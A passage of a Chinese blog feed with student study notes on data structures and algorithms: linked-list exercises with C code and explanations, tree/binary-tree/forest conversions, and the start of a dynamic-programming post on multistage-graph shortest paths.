aria-hidden="true">image-20230919200445761</figcaption></figure><p>这里的D是尾元结点</p><p><strong>【头结点】【头指针】【首元结点】</strong></p><p>头结点（不一定有），存在为了方便操作，头结点是为了操作的统一和方便而设立的，放在第一个元素的结点之前，其数据域一般无意义（但也可以用来存放链表的长度），对在第一元素结点前插入结点和删除第一结点起操作与其它结点的操作就统一了。</p><p>首元结点：实际记录数据的第一个节点；</p><p>头指针：指向第一个物理节点地址的指针，就是定义的链表名，这个头指针的意义在于，在访问链表时，总要知道链表存储在什么位置（从何处开始访问），由于链表的特性（next指针），知道了头指针，那么整个链表的元素都能够被访问，也就是说头指针是必须存在的。</p><h3 id="section-3">2.9</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 分析一下下面这段代码<br>Status A(LinkedList L) &#123; <span class="hljs-regexp">//</span>L 是无表头结点的单链表<br><span class="hljs-keyword">if</span>(L &amp;&amp; L-&gt;<span class="hljs-keyword">next</span>) &#123;<br>    Q=L; L=L-&gt;<span class="hljs-keyword">next</span>; P=L;<br>    <span class="hljs-keyword">while</span>(P-&gt;<span class="hljs-keyword">next</span>) P=P-&gt;<span class="hljs-keyword">next</span>;<br>    P-&gt;<span class="hljs-keyword">next</span>=Q; Q-&gt;<span class="hljs-keyword">next</span>=NULL;<br>&#125;<br>return OK;<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是一个函数<code>Status A(LinkedList L)</code>，其目的是将无表头结点的单链表<code>L</code> 中的首元素移到链表的末尾。以下是代码的逐行解释：</p><ol type="1"><li><code>if (L &amp;&amp; L-&gt;next)</code>：这是一个条件语句，确保链表<code>L</code>不为空且至少包含两个元素。如果链表为空或只包含一个元素，那么没有必要执行首元素移到末尾的操作。</li><li><code>Q = L;</code>：创建一个指向链表头结点的指针<code>Q</code>，用于暂时保存链表的首元素。</li><li><code>L = L-&gt;next;</code>：将链表头指针 <code>L</code>移动到链表的下一个元素，即跳过了原始的首元素。</li><li><code>P = L;</code>：创建一个指向链表头结点的新指针<code>P</code>，用于遍历链表并找到末尾元素。</li><li><code>while (P-&gt;next) P=P-&gt;next</code>：进入一个循环，该循环将<code>P</code> 移动到链表的最后一个元素，即当 <code>P</code>的下一个元素不为空时继续执行。</li><li><code>P-&gt;next = Q;</code>：将末尾元素的 <code>next</code>指针指向原始首元素 <code>Q</code>，这样就将首元素移到了链表的末尾。</li><li><code>Q-&gt;next = NULL;</code>：将原始首元素 <code>Q</code> 的<code>next</code> 指针设置为<code>NULL</code>，以确保它成为新链表的末尾元素。</li><li><code>return OK;</code>：函数返回 OK，表示操作成功完成。</li></ol><p>总之，这段代码的作用是将无表头结点的单链表 <code>L</code>中的首元素移到链表的末尾。如果链表为空或只包含一个元素，则不执行任何操作。否则，它将通过重新连接指针来实现首元素的移动。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//分析一下下面这段代码</span><br>void <span class="hljs-constructor">BB(LNode <span class="hljs-operator">*</span><span class="hljs-params">s</span>, LNode <span class="hljs-operator">*</span><span class="hljs-params">q</span>)</span> &#123;<br>    <span class="hljs-comment">// 声明指针 p，并将其初始化为 s</span><br>    p = s;<br>    <span class="hljs-comment">// 当 p 指向的结点的下一个结点不等于 q 时，执行循环</span><br>    <span class="hljs-keyword">while</span> (p-&gt;next != q) &#123;<br>        <span class="hljs-comment">// 将 p 移动到下一个结点</span><br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-comment">// 将 q 结点的 next 指针指向 s，形成闭环</span><br>    p-&gt;next = s;<br>&#125;<br>void <span class="hljs-constructor">AA(LNode <span class="hljs-operator">*</span><span class="hljs-params">pa</span>, LNode <span class="hljs-operator">*</span><span class="hljs-params">pb</span>)</span> &#123;<br>    <span class="hljs-comment">// 调用 BB 函数，将结点 pa 到 pb 之间的结点闭环</span><br>    <span class="hljs-constructor">BB(<span class="hljs-params">pa</span>, <span class="hljs-params">pb</span>)</span>;<br>    <span class="hljs-comment">// 再次调用 BB 函数，将结点 pb 到 pa 之间的结点闭环</span><br>    <span class="hljs-constructor">BB(<span class="hljs-params">pb</span>, <span class="hljs-params">pa</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="section-4">2.11</h3><ul class="task-list"><li><label><input type="checkbox" />2.11 设顺序表 va中的数据元素递增有序。试写一算法，将 x插入到顺序表的适当位置上，以保持该表的有序性。</label></li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs maxima">Status InsertOrderList(SqList &amp;va,ElemType x)<br>&#123;<br>//在非递减的顺序表 va 中插入元素 x 并使其仍成为顺序表的算法<br>int i;<br><span class="hljs-keyword">if</span>(va.<span class="hljs-built_in">length</span>==va.listsize)<span class="hljs-built_in">return</span>(OVERFLOW);<br><br><span class="hljs-keyword">for</span>(i=va.<span class="hljs-built_in">length</span>;i&gt;<span class="hljs-number">0</span>,x&lt;va.<span class="hljs-built_in">elem</span>[i-<span class="hljs-number">1</span>];i--)<br>va.<span class="hljs-built_in">elem</span>[i]=va.<span class="hljs-built_in">elem</span>[i-<span class="hljs-number">1</span>];<br><br>va.<span class="hljs-built_in">elem</span>[i]=x;<br>va.<span class="hljs-built_in">length</span>++;<br><span class="hljs-built_in">return</span> OK;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Status InsertOrderList(SqList &amp;va,ElemType x)</code></p><p>这行代码是一个函数的声明，具体解释如下：</p><ul><li><code>Status</code>：这是函数的返回类型。在C/C++中，函数通常会返回一个值，表示函数的执行结果或状态。在这里，函数返回类型是<code>Status</code>，这意味着该函数会返回一个表示操作状态的值。</li><li><code>InsertOrderList</code>：这是函数的名称。函数名用于标识和调用函数。在这个情境下，函数名是<code>InsertOrderList</code>，它表示这个函数的目的是将一个元素插入到一个顺序表中。</li><li><code>(SqList &amp;va, ElemType x)</code>：这是函数的参数列表。它指定了函数接受的输入参数。具体解释如下：<ul><li><code>SqList &amp;va</code>：这是第一个参数，它是一个引用（<code>&amp;</code>符号表示引用）。这意味着函数将接受一个名为 <code>va</code>的参数，这个参数是一个 <code>SqList</code>类型的顺序表。通过引用传递，函数可以直接修改传递给它的顺序表，而不需要复制整个数据结构，这可以提高性能并节省内存。</li><li><code>ElemType x</code>：这是第二个参数，它是一个名为 <code>x</code>的参数，表示要插入到顺序表中的元素。<code>ElemType</code>可能是一个在代码的其他地方定义的数据类型，用于表示元素的类型。</li></ul></li></ul><p>综上，这行代码的含义是声明一个名为 <code>InsertOrderList</code>的函数，该函数接受一个顺序表 <code>va</code> 和一个元素 <code>x</code>作为参数，并且会返回一个 <code>Status</code>类型的值，用于表示函数执行的状态或结果。</p><p><code>for (i = va.length; i &gt; 0 &amp;&amp; x &lt; va.elem[i - 1]; i--)    va.elem[i] = va.elem[i - 1];</code></p><ul><li><p>这是一个 <code>for</code>循环，从顺序表的最后一个元素开始向前遍历，同时检查元素 <code>x</code>是否小于当前位置的元素。循环条件包括两部分：<code>i &gt; 0</code>表示循环要继续直到遍历到顺序表的第一个元素；<code>x &lt; va.elem[i - 1]</code>表示只要元素 <code>x</code>小于当前位置的元素，就继续循环。这个循环的目的是找到插入位置。</p></li><li><p>在循环中，将当前位置的元素向后移动，以为新元素 <code>x</code>腾出位置。这是为了为新元素 <code>x</code>让路，为其找到适当的插入位置。</p></li></ul><h3 id="section-5">2.15</h3><ul class="task-list"><li><label><input type="checkbox" />2.15 已知指针 ha 和 hb分别指向两个单链表的头结点，并且已知两个链表的长度分别为 m 和n。试写一算法将这两个链表连接在一起，假设指针 hc指向连接后的链表的头结点，并要求算法以尽可能短的时间完成连接运算。</label></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xl">void MergeList_L(LinkList &amp;ha,LinkList &amp;hb,LinkList &amp;hc) <br>&#123; <br>    LinkList pa,pb; <br>    pa=ha; <br>    pb=hb; <br>    <span class="hljs-function"><span class="hljs-title">while</span>(pa-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>&amp;&amp;pb-&gt;</span>next)&#123; <br>        <span class="hljs-function"><span class="hljs-title">pa</span>=pa-&gt;</span>next; <br>        <span class="hljs-function"><span class="hljs-title">pb</span>=pb-&gt;</span>next; <br>    &#125; <br>    <span class="hljs-function"><span class="hljs-title">if</span>(!pa-&gt;</span>next)&#123;          <span class="hljs-comment">//pa到头了</span><br>        hc=hb; <br>        <span class="hljs-function"><span class="hljs-title">while</span>(pb-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>) pb=pb-&gt;</span>next; <br>        <span class="hljs-function"><span class="hljs-title">pb</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>=ha-&gt;</span>next; <br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        hc=ha; <br>        <span class="hljs-function"><span class="hljs-title">while</span>(pa-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>) pa=pa-&gt;</span>next; <br>        <span class="hljs-function"><span class="hljs-title">pa</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">next</span>=hb-&gt;</span>next; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="section-6">2.16</h3><p>已知指针 la 和 lb分别指向两个无头结点单链表中的首元结点。写一个算法实现:</p><ul class="task-list"><li><label><input type="checkbox" />从表 la 中删除自第 i 个元素起共 len个元素后，将它们插入到表 lb 中第 i 个元素之前。</label></li></ul><h3 id="section-7">2.22</h3><ul class="task-list"><li><label><input type="checkbox"checked="" />试写一算法，对单链表实现就地逆置。</label></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Lnode</span> &#123;</span><br>    ElemType data; <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Lnode</span> *<span class="hljs-title">next</span>;</span> <br>&#125; Lnode, *LinkList;<br><br><span class="hljs-comment">//Lnode，将 struct Lnode 重命名为 Lnode，这允许我们在代码中使用 Lnode 来声明结构体类型的变量。？？</span><br><span class="hljs-comment">//LinkList，将 struct Lnode* 重命名为 LinkList，这样我们可以使用 LinkList 来声明指向链表节点的指针变量。</span><br><br>Status <span class="hljs-title function_">ListOppose_L</span><span class="hljs-params">(LinkList &amp;L)</span> <br>&#123; <br>    LinkList p,q;   <span class="hljs-comment">//两个辅助指针</span><br>    p=L;       <span class="hljs-comment">//将 p 指针指向链表头节点。</span><br>    p=p-&gt;next;  <span class="hljs-comment">// 将 p 移动到链表的第一个真实节点，即跳过头节点。</span><br>    L-&gt;next=<span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 将头节点的 next 指针置空，即将逆置后的链表末尾节点的 next 指针指向空。</span><br>    <span class="hljs-keyword">while</span>(p)&#123; <br>        q=p;         <br>        p=p-&gt;next;   <span class="hljs-comment">//这两行就是把 q 指向 p，然后将 p 向后移动到下一个节点：</span><br>        q-&gt;next=L-&gt;next;  <br>        L-&gt;next=q;   <span class="hljs-comment">//这两行就是进行插入，即：将 q 所指的节点插入到现在的表 L 的头结点和首元结点中间：</span><br>    &#125; <br>    <span class="hljs-keyword">return</span> OK; <br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p><ahref="https://blog.csdn.net/qq_41109668/article/details/104636252?ops_request_misc=%7B%22request%5Fid%22%3A%22169519655816800227422429%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169519655816800227422429&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-104636252-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=试写一算法，对单链表实现就地逆置。&amp;spm=1018.2226.3001.4187">试写一算法，对单链表进行逆置试写一算法,实现单链表的就地逆置(要求在原链表上进行)_白薇.的博客-CSDN博客</a></p><p>大佬！！！这篇博客解释的非常清楚</p><h2 id="第三章">第三章</h2><h3 id="section-8">3.19</h3><p>括号匹配</p><h2 id="第六章-树">第六章 树</h2><h3 id="section-9">6.24</h3><p>树转换成二叉树：</p><ol type="1"><li>加线，所有兄弟结点之间连接一条线；</li><li>去线，对树中的每个结点，只保留它与第一个孩子结点的连线，删除与其他孩子结点之间的连线；</li><li>层次调整，以树的根结点为轴心，将整个树调节一下（第一个孩子是结点的左孩子，兄弟转过来的孩子是结点的右孩子）；</li></ol><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1698111444872.png"alt="1698111444872" /><figcaption aria-hidden="true">1698111444872</figcaption></figure><p>二叉树转换成树：</p><ol type="1"><li>加线。若某结点X的左孩子结点存在，则将这个左孩子的右孩子结点、右孩子的右孩子结点、右孩子的右孩子的右孩子结点…，都作为结点X的孩子。将结点X与这些右孩子结点用线连接起来。（即先将父节点与其所有非第一个孩子结点的结点相连）</li><li>去线。删除原二叉树中所有结点与其右孩子结点的连线。</li><li>层次调整。例子如下：</li></ol><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1698079388509.png"alt="1698079388509" /><figcaption aria-hidden="true">1698079388509</figcaption></figure><p>森林转换成二叉树：</p><p>森林是由若干棵树组成，可以将森林中的每棵树的根结点看作是兄弟，由于每棵树都可以转换为二叉树，所以森林也可以转换为二叉树。</p><ol type="1"><li>把每一棵树转换为二叉树</li><li>第一棵二叉树不动，第二棵树开始，以此把后一棵二叉树的根结点作为前一棵树的根结点的右子树连接起来</li></ol><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1698112427431.png"alt="1698112427431" /><figcaption aria-hidden="true">1698112427431</figcaption></figure><p>二叉树转换成森林：</p><ul><li>看二叉树的根结点是否有右孩子，有右结点是森林，无右结点是树。（根据孩子兄弟表示法，一棵树的根结点转换为二叉树，其二叉树的根结点无右孩子）</li><li>若是森林：<ul><li>依次把与右孩子结点的连线删除，得到分离的二叉树</li><li>把分离后的每棵二叉树转换为树；</li><li>整理第（2）步得到的树，使之规范，这样得到森林。例子如下：</li><li><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1698079139900.png"alt="1698079139900" /><figcaption aria-hidden="true">1698079139900</figcaption></figure></li></ul></li><li>若是树：<ul><li>参照二叉树转换成树</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法设计与分析-动态规划</title>
    <link href="/2023/09/18/%E7%AE%97%E6%B3%95%204-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <url>/2023/09/18/%E7%AE%97%E6%B3%95%204-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h2 id="多段图最短路径问题">多段图最短路径问题</h2><p>1</p><h3 id="动态规划法">动态规划法</h3><p><strong>动态规划法</strong>将待求解问题分解成若干个相互重叠的子问题，每个子问题对应决策过程的一个阶段，一般来说，子问题的重叠关系表现在对给定问题求解的递推关系(<em>称为动态规划函数</em>)中，将子问题的解求解一次并填入表中，当需要再次求解此子问题时，可以通过查表获得该子问题的解，从而避免了大量重复计算。具体的动态规划法多种多样，但都具有相同的填表形式。一般来说，动态规划法的求解过程由以下三个阶段组成：</p><ol type="1"><li><strong>划分子问题</strong>：将原问题分解为若干个子问题，每个子问题对应一个决策阶段，并且子问题之间具有重叠关系。</li><li><strong>确定动态规划函数</strong>：根据子问题之间的重叠关系找到子问题满足的递推关系式即动态规划函数，这是动态规划法的关键。</li><li><strong>填写表格</strong>：设计表格，以自底向上的方式计算各个子问题的解并填表，实现动态规划过程。</li></ol><p>上述动态规划过程可以求得问题的最优值即目标函数的极值，如果要求出具体的最优解，通常在动态规划过程中记录必要的信息，再根据最优决策序列构造最优解。</p><h3 id="多段图最短路径问题-1">多段图最短路径问题</h3><p>设图 <span class="math inline">\(G =（V,E）\)</span>是一个带权有向图，如果把顶点集合 V 划分成 k 个互不相交的子集 <spanclass="math inline">\(V_i（2≤k≤n,1≤i≤k）\)</span>，使得 E 中的任何一条边&lt;u,v&gt;，必有 <span class="math inline">\(u∈V_i, v∈V_{i + m}(i&lt;k,1&lt;i+m≤k)\)</span>,则称图 G 为多段图，称 s∈V1 为源点，t∈Vk为终点。</p><p>多段图的最短路径问题为从源点到终点的最小代价路径，如下动图所示：</p><blockquote><p>多段图是一个有向的无环图。求解从起始点到终止点的最短路径的长度，首先看一下这个问题是否具有最优子结构的性质。对于每一点来说，从v0到它的最短路径有两种可能，分别是从v0直接到该点或者是从最短的前驱节点开始到该节点。从这里可以看出有递归的性质，所以使用回溯的方法也是可以解决的。即从终点开始，依次向前找到最短的路径。由于递归本身所用的时间较长，并且在回溯的过程中存在重复的工作，所以使用动态规划更好。</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311082106575.gif"alt="2" /><figcaption aria-hidden="true">2</figcaption></figure><h3 id="最优子结构证明">最优子结构证明</h3><p>适合采用动态规划方法的最优化问题中的两要素：</p><p>✓ <strong>最优子结构</strong></p><p>✓ <strong>重叠子问题</strong></p><p><strong>一、 最优子结构</strong></p><ul><li><p>如果问题的最优解是由其子问题的最优解来构造的，则称该问题具有最优子结构</p></li><li><p>在动态规划中，我们利用子问题的最优解来构造问题的一个最优解，因此必须确保在我们所考虑的子问题范围中，包含了用于一个最优解的那些子问题</p></li></ul><p><strong>二、重叠子问题</strong></p><ul><li>适用于动态规划求解的最优化问题的第二个要素是子问题的空间要小，使用来解原问题的递归算法可反复解同样的子问题，而不总在产生新的子问题。</li><li>不同的子问题数是输入规模的一个多项式。</li><li>递归算法求解问题时，每次产生的子问题并不总是新问题，有些子问题被反复计算多次，该性质称为子问题的重叠性质</li></ul><p>设s，s，s1，s2，……，sp，t是s到t的一条最短路径，且s到s1的路径已经求出，则问题转为s1到t的最短路径，因此s1，s2，……，sp，t构成一条最短路径，如果不是，则设s1，r1，r2，……，rp，t是一条从s1到t的最短路径，则s，s1，r1，r2，……，rp，t是一条从s到t的最短路径且比s，s1，s2，……，sp，t短，因此矛盾，所以多段图的最短路径问题满足最优性原理。</p><h3 id="问题分析">问题分析</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311091126212.png"alt="image-20231108235209001" /><figcaption aria-hidden="true">image-20231108235209001</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311091125642.png"alt="image-20231109112545467" /><figcaption aria-hidden="true">image-20231109112545467</figcaption></figure><h3 id="程序实现">程序实现</h3><p><code>c</code></p><p><code>arc[N] [N]</code>：图的邻接矩阵 <code>cost[N]</code>：一维数组存储到每个顶点的最小开销。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311091147421.png"alt="image-20231109114707374" /><figcaption aria-hidden="true">image-20231109114707374</figcaption></figure><p><code>path[N]</code>：用来保存每个顶点的前驱顶点，注意这个前驱结点是最短路径上的</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311091147374.png"alt="image-20231109114720321" /><figcaption aria-hidden="true">image-20231109114720321</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 999999</span><br><br><span class="hljs-type">int</span> arc[N][N];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">CreateGraph</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> i, j, k;<br>    <span class="hljs-type">int</span> weight;<br>    <span class="hljs-type">int</span> vnum, arcnum;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入顶点的个数: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;vnum);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入边的个数: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;arcnum);<br>    <br>     <span class="hljs-comment">// 把arc初始化为一个vmun*vnum的矩阵，</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= vnum; i++) &#123;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= vnum; j++) &#123;<br>            arc[i][j] = MAX;<br>        &#125;<br>        arc[i][i] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 顶点到自身的距离为0</span><br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;请输入边的两个顶点和权值: \n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; arcnum; k++) &#123;<br>        <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %d&quot;</span>, &amp;i, &amp;j, &amp;weight);<br>        arc[i][j] = weight;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> vnum;<br>&#125;<br><br><span class="hljs-comment">//返回最短路径</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BackPath</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> &#123;<br>    <span class="hljs-type">int</span> i, j;<br>    <span class="hljs-comment">//cost[N]是一个一维数组表，用来存储源点到每个顶点的最小开销</span><br>    <span class="hljs-comment">//path[N]保存每个结点的前驱</span><br>    <span class="hljs-type">int</span> cost[N], path[N];<br><br>    <span class="hljs-comment">//cost[i]初始化为长度为n的一维数组，值为arc[1][i]，即为源点到每个顶点的距离</span><br>    <span class="hljs-comment">//path[i]，用来保存每个顶点的前驱顶点，先都初始化为1，后面不更新的话就是1-&gt;n，注意这个前驱结点是最短路径上的</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        cost[i] = arc[<span class="hljs-number">1</span>][i];<br>        path[i] = <span class="hljs-number">1</span>;<br>    &#125;<br><br><span class="hljs-comment">//for i=2,因为第一行已经赋值给cost[i]了，所以只需要遍历n-1行即可</span><br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= n; j++) &#123;<br>            <span class="hljs-comment">// 检查是否存在一条从源点1经过顶点 i 到达顶点 j 的路径，其开销小于当前的 cost[j]，小于的话就更新cost[j]</span><br>            <span class="hljs-keyword">if</span> (cost[i] + arc[i][j] &lt; cost[j]) &#123;<br>                cost[j] = arc[i][j] + cost[i];<br>                path[j] = i;   <span class="hljs-comment">// 更新路径上的前一个顶点</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;从顶点1到顶点%d的最小开销为：%d，路径为：&quot;</span>, i, cost[i]);<br>        j = i;<br>        <span class="hljs-keyword">while</span> (j != <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &lt;- &quot;</span>, j);  <span class="hljs-comment">// 输出路径</span><br>            j = path[j];  <span class="hljs-comment">// 回溯路径上的前一个顶点</span><br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> vnum = CreateGraph();<br>    BackPath(vnum);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>c++</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 